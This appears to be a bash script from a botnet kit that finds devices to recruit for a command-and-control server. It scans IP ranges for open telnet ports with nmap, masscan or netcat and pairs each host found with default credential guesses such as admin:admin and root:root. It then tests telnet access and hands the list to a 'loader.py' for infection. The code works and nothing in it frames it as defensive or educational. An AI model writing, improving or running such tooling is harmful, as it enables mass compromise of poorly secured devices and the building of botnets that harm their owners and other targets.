#!/bin/bash

# Target Discovery Script for Bot Collection
# This script helps discover potential targets for your CNC server

echo "=== Target Discovery Script ==="
echo

# Function to scan IP range
scan_range() {
    local range=$1
    local port=$2
    local output=$3
    
    echo "[INFO] Scanning range $range for port $port"
    
    # Use nmap for detailed scanning
    if command -v nmap &> /dev/null; then
        nmap -p $port --open -oG $output $range
    # Use masscan for fast scanning
    elif command -v masscan &> /dev/null; then
        masscan -p $port --rate=1000 -oG $output $range
    # Use nc for basic scanning
    else
        echo "[WARNING] nmap and masscan not found, using basic nc scan"
        for ip in $(seq -f "192.168.%g.1" 0 255); do
            timeout 1 nc -z $ip $port 2>/dev/null && echo "$ip:$port" >> $output
        done
    fi
}

# Function to extract IPs from scan results
extract_ips() {
    local input=$1
    local output=$2
    
    echo "[INFO] Extracting IPs from $input"
    
    if [ -f "$input" ]; then
        grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' $input | sort -u > $output
        echo "[INFO] Found $(wc -l < $output) unique IPs"
    else
        echo "[ERROR] Input file $input not found"
    fi
}

# Function to test telnet connectivity
test_telnet() {
    local ip=$1
    local timeout=3
    
    timeout $timeout telnet $ip 23 << EOF
quit
EOF
    return $?
}

# Function to create target list
create_target_list() {
    local ip_file=$1
    local output=$2
    
    echo "[INFO] Creating target list from $ip_file"
    
    if [ -f "$ip_file" ]; then
        > $output  # Clear output file
        
        while read -r ip; do
            if [ -n "$ip" ] && [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
                echo "$ip:23 admin:admin" >> $output
                echo "$ip:23 root:root" >> $output
                echo "$ip:23 admin:password" >> $output
                echo "$ip:23 root:admin" >> $output
                echo "$ip:23 admin:" >> $output
                echo "$ip:23 root:" >> $output
            fi
        done < $ip_file
        
        echo "[INFO] Created target list with $(wc -l < $output) entries"
    else
        echo "[ERROR] IP file $ip_file not found"
    fi
}

# Main execution
main() {
    echo "=== Target Discovery Options ==="
    echo "1. Scan local network (192.168.1.0/24)"
    echo "2. Scan custom range"
    echo "3. Load from file"
    echo "4. Test existing targets"
    echo "5. Create target list"
    echo
    
    read -p "Choose option (1-5): " choice
    
    case $choice in
        1)
            echo "[INFO] Scanning local network for telnet services"
            scan_range "192.168.1.0/24" "23" "telnet_scan.txt"
            extract_ips "telnet_scan.txt" "found_ips.txt"
            create_target_list "found_ips.txt" "targets.txt"
            ;;
        2)
            read -p "Enter IP range (e.g., 192.168.1.0/24): " range
            echo "[INFO] Scanning range $range for telnet services"
            scan_range "$range" "23" "telnet_scan.txt"
            extract_ips "telnet_scan.txt" "found_ips.txt"
            create_target_list "found_ips.txt" "targets.txt"
            ;;
        3)
            read -p "Enter filename with IPs: " filename
            if [ -f "$filename" ]; then
                extract_ips "$filename" "found_ips.txt"
                create_target_list "found_ips.txt" "targets.txt"
            else
                echo "[ERROR] File $filename not found"
            fi
            ;;
        4)
            read -p "Enter filename with targets: " filename
            if [ -f "$filename" ]; then
                echo "[INFO] Testing targets in $filename"
                while read -r line; do
                    if [[ $line =~ ^([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):23 ]]; then
                        ip="${BASH_REMATCH[1]}"
                        if test_telnet "$ip"; then
                            echo "[SUCCESS] $ip:23 is accessible"
                        else
                            echo "[FAILED] $ip:23 is not accessible"
                        fi
                    fi
                done < "$filename"
            else
                echo "[ERROR] File $filename not found"
            fi
            ;;
        5)
            read -p "Enter filename with IPs: " filename
            if [ -f "$filename" ]; then
                create_target_list "$filename" "targets.txt"
            else
                echo "[ERROR] File $filename not found"
            fi
            ;;
        *)
            echo "[ERROR] Invalid option"
            exit 1
            ;;
    esac
    
    echo
    echo "=== Results ==="
    if [ -f "targets.txt" ]; then
        echo "Target list created: targets.txt"
        echo "Total targets: $(wc -l < targets.txt)"
        echo
        echo "First 10 targets:"
        head -10 targets.txt
        echo
        echo "To use with loader.py:"
        echo "python loader.py targets.txt"
    fi
}

# Check dependencies
check_dependencies() {
    echo "[INFO] Checking dependencies..."
    
    if command -v nmap &> /dev/null; then
        echo "✅ nmap found"
    elif command -v masscan &> /dev/null; then
        echo "✅ masscan found"
    else
        echo "⚠️  nmap and masscan not found, using basic nc scan"
    fi
    
    if command -v telnet &> /dev/null; then
        echo "✅ telnet found"
    else
        echo "❌ telnet not found"
    fi
    
    if command -v nc &> /dev/null; then
        echo "✅ nc found"
    else
        echo "❌ nc not found"
    fi
    
    echo
}

# Run main function
check_dependencies
main
